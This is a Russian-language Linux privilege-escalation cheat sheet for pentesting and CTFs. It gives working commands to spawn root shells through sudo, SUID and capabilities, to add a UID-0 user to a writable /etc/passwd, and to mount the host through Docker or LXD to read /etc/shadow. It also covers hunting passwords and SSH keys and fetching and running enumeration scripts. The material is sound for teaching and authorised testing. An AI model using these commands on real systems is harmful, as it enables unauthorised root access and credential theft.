# 🔐 Linux Privilege Escalation — полная шпаргалка

> **Что такое повышение привилегий:** Это процесс перехода от обычного пользователя к пользователю с более высокими правами (обычно **root**). В пентесте и CTF это ключевой этап, который превращает «просто доступ» в «полный контроль над системой». Чаще всего это не про сложные эксплойты, а про **находчивость и внимание к деталям** — вы ищете одну неправильную настройку, которая даёт вам root.

---

## 🚪 Оглавление
- [📌 1. Что такое повышение привилегий](#-1-что-такое-повышение-привилегий)
- [🔍 2. Этап 0: Стабилизация шелла](#-2-этап-0-стабилизация-шелла)
- [🧠 3. Этап 1: Ручное перечисление (Situational Awareness)](#-3-этап-1-ручное-перечисление-situational-awareness)
- [🤖 4. Этап 2: Автоматизированные инструменты](#-4-этап-2-автоматизированные-инструменты)
- [🎯 5. Основные векторы повышения привилегий](#-5-основные-векторы-повышения-привилегий)
  - [5.1 SUID / SGID биты](#51-suid--sgid-биты)
  - [5.2 Sudo](#52-sudo)
  - [5.3 Cron-задачи](#53-cron-задачи)
  - [5.4 PATH hijacking](#54-path-hijacking)
  - [5.5 Linux Capabilities](#55-linux-capabilities)
  - [5.6 Writable /etc/passwd](#56-writable-etcpasswd)
  - [5.7 Ядро (Kernel Exploits)](#57-ядро-kernel-exploits)
  - [5.8 Пароли и учётные данные в файлах](#58-пароли-и-учётные-данные-в-файлах)
  - [5.9 Группы (LXD, Docker, Disk, Adm)](#59-группы-lxd-docker-disk-adm)
  - [5.10 NFS (Network File System)](#510-nfs-network-file-system)
- [🧰 6. GTFOBins — твой лучший друг](#-6-gtfobins-твой-лучший-друг)
- [📚 7. Полезные ссылки](#-7-полезные-ссылки)

---

## 📌 1. Что такое повышение привилегий

Повышение привилегий — это процесс получения доступа к ресурсам или функциям, которые обычно недоступны для текущего пользователя.

В Linux цель почти всегда одна — **стать root (UID 0)**. Root может читать любые файлы (включая `/etc/shadow`), устанавливать постоянный доступ, собирать учётные данные и делать всё, что захочет.

> **Главное правило:** 80% успеха — это правильное перечисление (enumeration). Не торопитесь, собирайте информацию и ищите лёгкие пути.

---

## 🔍 2. Этап 0: Стабилизация шелла

Часто после получения доступа у вас неполноценный шелл. Стабилизируйте его перед началом перечисления:

```bash
# Python PTY (самый надёжный способ)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Затем нажми Ctrl+Z, чтобы отправить в фон, и выполни:
stty raw -echo; fg
# Нажми Enter дважды, затем:
export TERM=xterm
export SHELL=/bin/bash

# Альтернативы
script /dev/null -c bash
/usr/bin/expect -c 'spawn /bin/bash;interact'
```

---

## 🧠 3. Этап 1: Ручное перечисление (Situational Awareness)

Прежде чем запускать автоматические инструменты, соберите базовую информацию руками:

### Кто я?
```bash
id                    # текущий пользователь, UID, GID, группы
whoami                # имя пользователя
groups                # группы, в которых состоит пользователь
cat /etc/passwd | grep -v nologin   # все пользователи с шеллом
cat /etc/group        # все группы
last -a               # история входов
w                     # кто сейчас залогинен
```

### Где я?
```bash
hostname              # имя хоста
hostname -f           # полное доменное имя
cat /etc/issue        # версия ОС (баннер)
cat /etc/*-release    # подробная информация об ОС
uname -a              # версия ядра
arch                  # архитектура
lscpu                 # информация о процессоре
df -h                 # использование дисков
mount                 # примонтированные файловые системы
cat /proc/version     # детали версии ядра
dmesg | grep -i "Linux version"
```

### Окружение и история
```bash
env                   # переменные окружения
echo $PATH            # текущий PATH
echo $USER            # текущий пользователь
echo $HOME            # домашняя директория
pwd                   # текущая директория
cat /etc/profile      # системные переменные
cat /etc/bashrc       # системный bash-конфиг
cat ~/.bashrc         # пользовательский bash-конфиг
cat ~/.bash_history   # история команд (ЗОЛОТАЯ ЖИЛА!)
history
```

### Что я могу видеть/читать?
```bash
ls -la ~
ls -la /home
find / -writable -type d 2>/dev/null   # куда я могу писать?
```

---

## 🤖 4. Этап 2: Автоматизированные инструменты

После ручного перечисления запустите автоматический скрипт. Он найдёт то, что вы могли пропустить.

### LinPEAS (лучший инструмент)
```bash
# Скачать и запустить
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
LinPEAS автоматически проверяет SUID, sudo, cron, capabilities, PATH и многое другое.

### LinEnum (альтернатива)
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### pspy — наблюдение за процессами в реальном времени
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```
pspy показывает процессы, которые запускаются в реальном времени (например, cron-задачи).

---

## 🎯 5. Основные векторы повышения привилегий

### 5.1 SUID / SGID биты

**Что это:** Если на бинарном файле установлен SUID-бит, он запускается с правами владельца (обычно root). Если такой бинарник позволяет выполнить команды или запустить шелл — вы можете получить root.

**Как найти:**
```bash
# Все SUID-файлы
find / -perm -4000 -type f 2>/dev/null

# Все SGID-файлы
find / -perm -2000 -type f 2>/dev/null

# Комбинированный поиск
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```

**Пример с Python (Cap):**
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Как использовать GTFOBins:** Найди бинарник в списке SUID на [GTFOBins](https://gtfobins.github.io/#+suid) и используй готовый пейлоад.

---

### 5.2 Sudo

**Что это:** Если пользователь может запускать команды через `sudo` без пароля или с ограничениями, это можно использовать для повышения привилегий.

**Проверка:**
```bash
sudo -l   # показать, что можно запускать
```

**Если есть `find`:**
```bash
sudo find . -exec /bin/bash -p \; -quit
```

**Если есть `vim`:**
```bash
sudo vim -c '!/bin/bash'
```

**Если есть `python` / `perl` / `ruby`:**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

> **Важно:** Всегда проверяй [GTFOBins](https://gtfobins.github.io/#+sudo) для найденных бинарников — там есть готовые команды для каждого из них.

---

### 5.3 Cron-задачи

**Что это:** Cron — это планировщик задач, который запускает скрипты от имени root. Если вы можете перезаписать скрипт, который выполняется cron-ом, вы получите root.

**Где искать:**
```bash
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
cat /etc/cron.hourly/*
cat /etc/cron.daily/*
cat /etc/cron.weekly/*
cat /etc/cron.monthly/*
crontab -l
```

**Как проверить, можно ли писать:**
```bash
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null
```

**Если нашёл writable-скрипт:** добавь в него реверс-шелл или команду, которая даст root.

---

### 5.4 PATH hijacking

**Что это:** Если программа с SUID или sudo вызывает другую программу по имени (без полного пути), и вы можете перезаписать эту программу, она выполнится с правами root.

**Проверка PATH:**
```bash
echo $PATH
find / -writable -type d 2>/dev/null | grep -E "($(echo $PATH | tr ':' '|'))"
```

**Как эксплуатировать:** Если в PATH есть writable-директория, создайте там поддельный бинарник с тем же именем, которое вызывает целевая программа.

---

### 5.5 Linux Capabilities

**Что это:** Capabilities — это «тонкие» права, которые можно дать бинарнику, не делая его полностью SUID.

**Поиск:**
```bash
getcap -r / 2>/dev/null
```

**Пример с `cap_setuid`:**
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

### 5.6 Writable /etc/passwd

**Что это:** Если файл `/etc/passwd` доступен для записи, вы можете добавить нового пользователя с UID 0 (root).

**Как проверить:**
```bash
ls -la /etc/passwd
```

**Как эксплуатировать:**
```bash
# Сгенерировать хеш пароля
openssl passwd -1 -salt hacker hacker123
# Добавить в /etc/passwd
echo 'hacker:$1$hacker$TzyKlv0UF/c5wG8M.8m2L/:0:0:root:/root:/bin/bash' >> /etc/passwd
# Затем войти как hacker с паролем hacker123
```

---

### 5.7 Ядро (Kernel Exploits)

**Что это:** Если ядро устарело, может существовать публичный эксплойт, который даёт root.

**Проверка:**
```bash
uname -a
cat /proc/version
```

**Поиск эксплойтов:**
```bash
# Используй searchsploit на своей машине
searchsploit linux kernel <версия>

# На целевой машине проверь DirtyCow и другие известные эксплойты
```

> **Осторожно:** Эксплойты ядра могут привести к падению системы. Используй их осторожно, особенно на продакшене.

---

### 5.8 Пароли и учётные данные в файлах

**Где искать:**
```bash
# История команд
cat ~/.bash_history
cat ~/.mysql_history

# Конфиги
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null

# SSH-ключи
find /home -name "id_rsa" 2>/dev/null
find /root -name "id_rsa" 2>/dev/null

# Файлы с расширениями
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.ini" -exec grep -l "password" {} \; 2>/dev/null
```

---

### 5.9 Группы (LXD, Docker, Disk, Adm)

Некоторые группы дают возможность повысить привилегии.

**Проверка групп:**
```bash
id
groups
```

| Группа | Как эксплуатировать |
| :--- | :--- |
| **LXD** | `lxc init ubuntu:18.04 test -c security.privileged=true`<br>`lxc config device add test mydevice disk source=/ path=/mnt/root recursive=true`<br>`lxc start test` |
| **Docker** | `docker run -it -v /:/mnt ubuntu /bin/bash`<br>Затем читаешь `/mnt/etc/shadow` |
| **Disk** | Доступ к `/dev/sda*` → читаешь `/etc/shadow` напрямую |
| **Adm** | Чтение логов → поиск паролей |

---

### 5.10 NFS (Network File System)

**Что это:** Если есть экспортированная NFS-шара с опцией `no_root_squash`, можно смонтировать её и создать SUID-файл от имени root.

**Проверка:**
```bash
cat /etc/exports
showmount -e localhost
```

---

## 🧰 6. GTFOBins — твой лучший друг

**GTFOBins** — это curated-список Unix-бинарников, которые можно использовать для обхода ограничений безопасности. Если ты нашёл:
- SUID-бинарник
- Sudo-правило
- Capability

— иди на [GTFOBins](https://gtfobins.github.io/) и ищи бинарник. Там будут готовые команды для:
- Получения шелла (`shell`)
- Чтения файлов (`file-read`)
- Записи файлов (`file-write`)
- Выполнения команд (`command`)

---

## 📚 7. Полезные ссылки

- [GTFOBins](https://gtfobins.github.io/) — база бинарников для повышения привилегий
- [HackTricks — Linux Privilege Escalation Checklist](https://hacktricks.wiki/en/linux-hardening/main-system-information/linux-privilege-escalation-checklist.html)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) — автоматическое перечисление
- [pspy](https://github.com/DominicBreuker/pspy) — мониторинг процессов в реальном времени
- [LinuxPrivEsc (The Bible)](https://github.com/ThatTotallyRealMyth/LinuxPrivEsc) — подробная шпаргалка
- [Linux Privilege Escalation — SecureLayer7](https://securelayer7.net/learn/privilege-escalation/linux-privilege-escalation)

---

*Обновлено: 2026-08-03*
